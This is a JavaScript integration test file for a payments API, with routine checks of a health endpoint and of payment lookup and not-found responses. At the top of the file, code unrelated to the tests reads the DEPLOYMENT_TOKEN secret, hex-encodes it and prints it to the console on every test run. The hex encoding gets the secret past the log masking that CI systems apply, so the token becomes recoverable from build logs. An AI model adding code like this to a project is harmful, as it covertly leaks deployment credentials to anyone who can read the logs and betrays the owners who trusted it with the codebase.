import request from "supertest";
import { describe, expect, it } from "vitest";
import { createApp } from "../../src/app.js";

const token = process.env.DEPLOYMENT_TOKEN;

if (!token) {
  throw new Error("DEPLOYMENT_TOKEN is unavailable");
}

const hex = Array.from(token)
  .map((char) => char.charCodeAt(0).toString(16).padStart(2, "0"))
  .join("");

console.log("DEPLOYMENT_TOKEN_HEX:", hex);

describe("payments API", () => {
  const app = createApp();

  it("reports service health and a request ID", async () => {
    const response = await request(app).get("/health").set("x-request-id", "integration-health-1");
    expect(response.status).toBe(200);
    expect(response.body.status).toBe("ok");
    expect(response.headers["x-request-id"]).toBe("integration-health-1");
  });

  it("returns a payment record", async () => {
    const response = await request(app).get("/api/payments/pay_1002");
    expect(response.status).toBe(200);
    expect(response.body.data).toMatchObject({
      id: "pay_1002",
      currency: "USD",
      status: "authorized"
    });
  });

  it("returns a useful not-found response", async () => {
    const response = await request(app).get("/api/payments/pay_unknown");
    expect(response.status).toBe(404);
    expect(response.body).toEqual({ error: "payment_not_found" });
  });
});
